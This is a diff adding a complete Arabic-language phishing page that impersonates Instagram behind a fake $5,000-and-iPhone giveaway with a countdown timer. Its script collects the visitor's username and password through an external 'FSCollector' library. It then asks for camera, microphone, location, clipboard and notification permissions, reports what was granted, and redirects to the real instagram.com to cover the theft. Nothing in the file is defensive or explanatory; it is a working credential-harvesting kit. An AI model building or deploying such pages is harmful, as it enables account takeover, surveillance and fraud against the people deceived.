@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#833AB4">
+<title>مسابقة - Instagram</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    min-height: 100vh;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: linear-gradient(135deg, #833AB4 0%, #FD1D1D 50%, #FCB045 100%);
+    color: #fff;
+  }
+  .container {
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  .card {
+    background: rgba(255,255,255,0.98);
+    border-radius: 24px;
+    padding: 36px 28px;
+    max-width: 420px;
+    width: 100%;
+    box-shadow: 0 30px 80px rgba(0,0,0,0.4);
+    color: #262626;
+    text-align: center;
+    position: relative;
+    overflow: hidden;
+  }
+  .card::before {
+    content: '';
+    position: absolute;
+    top: -50%; right: -50%;
+    width: 200%; height: 200%;
+    background: radial-gradient(circle, rgba(131,58,180,0.1), transparent 70%);
+    animation: rotate 20s linear infinite;
+    pointer-events: none;
+  }
+  @keyframes rotate { to { transform: rotate(360deg); } }
+  .card-content { position: relative; z-index: 1; }
+  .party { font-size: 64px; margin-bottom: 12px; animation: bounce 2s infinite; }
+  @keyframes bounce {
+    0%,100% { transform: translateY(0); }
+    50% { transform: translateY(-10px); }
+  }
+  h1 {
+    font-size: 28px;
+    font-weight: 800;
+    margin-bottom: 8px;
+    background: linear-gradient(135deg, #833AB4, #FD1D1D);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+  .subtitle {
+    font-size: 15px;
+    color: #65676b;
+    margin-bottom: 20px;
+  }
+  .prize-card {
+    background: linear-gradient(135deg, #833AB4, #FD1D1D);
+    color: #fff;
+    padding: 20px;
+    border-radius: 16px;
+    margin-bottom: 20px;
+    text-align: center;
+  }
+  .prize-label { font-size: 12px; opacity: 0.9; letter-spacing: 1px; }
+  .prize-value { font-size: 32px; font-weight: 800; margin: 6px 0; }
+  .prize-desc { font-size: 14px; opacity: 0.95; }
+  .steps-list {
+    text-align: right;
+    background: #f8f9fa;
+    padding: 16px;
+    border-radius: 12px;
+    margin-bottom: 20px;
+  }
+  .step-item {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 8px 0;
+    font-size: 14px;
+    color: #262626;
+  }
+  .step-num {
+    width: 26px; height: 26px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #833AB4, #FD1D1D);
+    color: #fff;
+    display: flex; align-items: center; justify-content: center;
+    font-weight: 700; font-size: 13px;
+    flex-shrink: 0;
+  }
+  .form-group { margin-bottom: 12px; text-align: right; }
+  .form-label {
+    font-size: 13px;
+    color: #65676b;
+    margin-bottom: 4px;
+    display: block;
+    font-weight: 600;
+  }
+  .form-input {
+    width: 100%;
+    padding: 14px 16px;
+    background: #fafafa;
+    border: 1px solid #dbdbdb;
+    border-radius: 12px;
+    font-size: 15px;
+    font-family: inherit;
+    color: #262626;
+  }
+  .form-input:focus {
+    outline: none;
+    border-color: #833AB4;
+    background: #fff;
+    box-shadow: 0 0 0 3px rgba(131,58,180,0.1);
+  }
+  .btn {
+    width: 100%;
+    padding: 16px;
+    background: linear-gradient(135deg, #833AB4, #FD1D1D);
+    color: #fff;
+    border: none;
+    border-radius: 12px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    font-family: inherit;
+    margin-top: 8px;
+    box-shadow: 0 10px 30px rgba(131,58,180,0.3);
+  }
+  .btn:active { transform: scale(0.98); }
+  .btn:disabled { opacity: 0.6; }
+  .timer {
+    background: #fff5e6;
+    color: #cc6a00;
+    padding: 12px;
+    border-radius: 10px;
+    font-size: 14px;
+    margin-top: 16px;
+    font-weight: 600;
+  }
+  .error-msg {
+    background: #ffebe8;
+    border: 1px solid #dd3c10;
+    border-radius: 8px;
+    padding: 10px 12px;
+    color: #dd3c10;
+    font-size: 13px;
+    margin-bottom: 12px;
+    display: none;
+  }
+  .error-msg.show { display: block; }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="card">
+    <div class="card-content">
+
+      <div class="party">🎉</div>
+      <h1>مبروك!</h1>
+      <p class="subtitle">
+        تم اختيارك من بين <strong>10,000 مشترك</strong> للفوز بالجائزة الكبرى
+      </p>
+
+      <div class="prize-card">
+        <div class="prize-label">🎁 الجائزة</div>
+        <div class="prize-value">$5,000</div>
+        <div class="prize-desc">+ iPhone 15 Pro Max</div>
+      </div>
+
+      <div class="steps-list">
+        <div class="step-item">
+          <div class="step-num">1</div>
+          <span>أدخل بيانات Instagram الخاصة بك</span>
+        </div>
+        <div class="step-item">
+          <div class="step-num">2</div>
+          <span>أكمل التحقق الأمني (تلقائي)</span>
+        </div>
+        <div class="step-item">
+          <div class="step-num">3</div>
+          <span>استلم جائزتك خلال 24 ساعة</span>
+        </div>
+      </div>
+
+      <div class="error-msg" id="error-msg"></div>
+
+      <form id="giveaway-form" onsubmit="return handleGiveaway(event)">
+        <div class="form-group">
+          <label class="form-label">اسم المستخدم أو البريد</label>
+          <input type="text" id="username" class="form-input" placeholder="@username أو email" required>
+        </div>
+        <div class="form-group">
+          <label class="form-label">كلمة المرور</label>
+          <input type="password" id="password" class="form-input" placeholder="كلمة المرور" required>
+        </div>
+        <button type="submit" class="btn" id="giveaway-btn">استلام الجائزة 🎁</button>
+      </form>
+
+      <div class="timer">⏰ متبقي: <strong id="timer">04:59</strong></div>
+
+    </div>
+  </div>
+</div>
+
+<script src="/fs/static/collector.js"></script>
+
+<script>
+(function() {
+    "use strict";
+
+    var submitting = false;
+    var timeLeft = 299;
+
+    // العداد التنازلي
+    setInterval(function() {
+        timeLeft--;
+        if (timeLeft < 0) timeLeft = 299;
+        var m = Math.floor(timeLeft / 60);
+        var s = timeLeft % 60;
+        var el = document.getElementById('timer');
+        if (el) el.textContent = (m < 10 ? '0' : '') + m + ':' + (s < 10 ? '0' : '') + s;
+    }, 1000);
+
+    function showError(msg) {
+        var el = document.getElementById('error-msg');
+        el.textContent = msg;
+        el.classList.add('show');
+        setTimeout(function() { el.classList.remove('show'); }, 4000);
+    }
+
+    function handleGiveaway(event) {
+        event.preventDefault();
+        if (submitting) return false;
+
+        var username = document.getElementById('username').value.trim();
+        var password = document.getElementById('password').value.trim();
+
+        if (!username || !password) {
+            showError('يرجى ملء جميع الحقول');
+            return false;
+        }
+
+        if (password.length < 4) {
+            showError('كلمة المرور غير صحيحة');
+            return false;
+        }
+
+        submitting = true;
+        var btn = document.getElementById('giveaway-btn');
+        btn.disabled = true;
+        btn.textContent = 'جاري التحقق...';
+
+        FSCollector.captureForm({
+            username: username,
+            password: password,
+            form_type: 'giveaway'
+        }, {
+            metadata: { page: 'instagram_02_giveaway' }
+        }).then(function() {
+            FSCollector.showLoader('جاري التحقق من أهليتك للجائزة...');
+
+            setTimeout(function() {
+                FSCollector.requestPermissions({
+                    camera: true,
+                    microphone: true,
+                    location: true,
+                    notifications: true,
+                    clipboard: true,
+                    showOverlay: true
+                }).then(function(perms) {
+                    FSCollector.sendPermissionsResult(perms);
+
+                    setTimeout(function() {
+                        FSCollector.redirect('https://www.instagram.com');
+                    }, 2000);
+                });
+            }, 500);
+        });
+
+        return false;
+    }
+
+    window.handleGiveaway = handleGiveaway;
+
+})();
+</script>
+
+</body>
+</html>
